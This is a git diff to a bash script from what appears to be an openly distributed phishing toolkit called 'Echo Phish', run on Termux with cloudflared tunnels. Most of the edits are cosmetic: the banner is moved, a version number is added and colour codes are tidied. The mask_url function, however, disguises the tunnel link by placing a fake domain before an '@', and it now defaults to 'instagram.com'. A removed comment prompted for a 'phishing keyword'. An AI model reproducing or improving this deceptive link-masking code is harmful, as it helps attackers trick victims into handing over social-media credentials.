@@ -8,6 +8,24 @@ BLUE='\033[0;34m'
 BOLD='\033[1m'
 RESET='\033[0m'
 
+VERSION = 2.4
+
+banner() {
+    echo -e "${CYAN} _____                                                     _____ "
+    echo -e "( ___ )                                                   ( ___ )"
+    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
+    echo -e " |   |  ______     _             _____  _     _     _      |   | "
+    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
+    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
+    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
+    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
+    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
+    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
+    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
+    echo -e "           https://t.me/AzerbaijanTermux        V${VERSION}\n"
+    echo -e "${RED}    "
+}
+
 cleanup() {
     if pgrep -f "cloudflared" > /dev/null; then
         killall cloudflared
@@ -42,7 +60,7 @@ check_update() {
     REMOTE_COMMIT=$(git rev-parse origin/$(git rev-parse --abbrev-ref HEAD))
 
     if [ "$LOCAL_COMMIT" != "$REMOTE_COMMIT" ]; then
-        echo -e -n "\n${YELLOW} [ ? ] A new update is available. Do you want to update? (Yes/No): ${YELLOW}"
+        echo -e -n "\n${YELLOW} [ ? ] A new update is available. New version:${VERSION}. Do you want to update? (Yes/No): ${RESET}"
         read -r response
         if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
             echo -e "\n${YELLOW} [ ? ] Updating...\n${RESET}"
@@ -63,23 +81,6 @@ check_update() {
         sleep 1
     fi
 }
-
-banner() {
-    echo -e "${CYAN} _____                                                     _____ "
-    echo -e "( ___ )                                                   ( ___ )"
-    echo -e " |   |~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|   | "
-    echo -e " |   |  ______     _             _____  _     _     _      |   | "
-    echo -e " |   | |  ____|   | |           |  __ \\| |   (_)   | |     |   | "
-    echo -e " |   | | |__   ___| |__   ___   | |__) | |__  _ ___| |__   |   | "
-    echo -e " |   | |  __| / __| '_ \\ / _ \\  |  ___/| '_ \\| / __| '_ \\  |   | "
-    echo -e " |   | | |___| (__| | | | (_) | | |    | | | | \\__ \\ | | | |   | "
-    echo -e " |   | |______\\___|_| |_|\\___/  |_|    |_| |_|_|___/_| |_| |   | "
-    echo -e " |___|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|___| "
-    echo -e "(_____)                                                   (_____)${RESET}${YELLOW}"
-    echo -e "           https://t.me/AzerbaijanTermux        V2.3\n"
-    echo -e "${RED}    "
-}
-
 
 cloudflared_install() {
     if [ -d "/data/data/com.termux" ]; then
@@ -181,12 +182,10 @@ install_python_dependencies() {
 mask_url() {
     local long_url="$1"
 
-    echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (e.g., instagram.com): ${YELLOW}"
+    echo -e -n "\n${YELLOW} [ ? ] Enter your custom domain (e.g., instagram.com): ${RESET}"
     read -r custom_domain
-    
-    #echo -e -n "\n${YELLOW} [ ? ] Enter phishing keyword (e.g., account, login): ${YELLOW}"
-    #read -r phish_keyword
-    
+    custom_domain=${custom_domain:-"instagram.com"}
+
     local masked_url=$(echo "$long_url" | sed "s|//|://${custom_domain}@|")
    
     echo -e "${YELLOW} \nMasked url: "
@@ -268,7 +267,7 @@ select_methode () {
             echo -e "${GREEN} [ + ] https://${original_url}${YELLOW}"
             echo -e "------------------------------------------------"
 
-            echo -e -n "\n${YELLOW} [ ? ] Do you want mask url? (Y/N): ${YELLOW}"
+            echo -e -n "\n${YELLOW} [ ? ] Do you want mask url? (Y/N): ${RESET}"
             read -r response
             if [[ "$response" =~ ^[Yy][Ee][Ss]$ || "$response" =~ ^[Yy]$ ]]; then
                 mask_url https://${original_url}
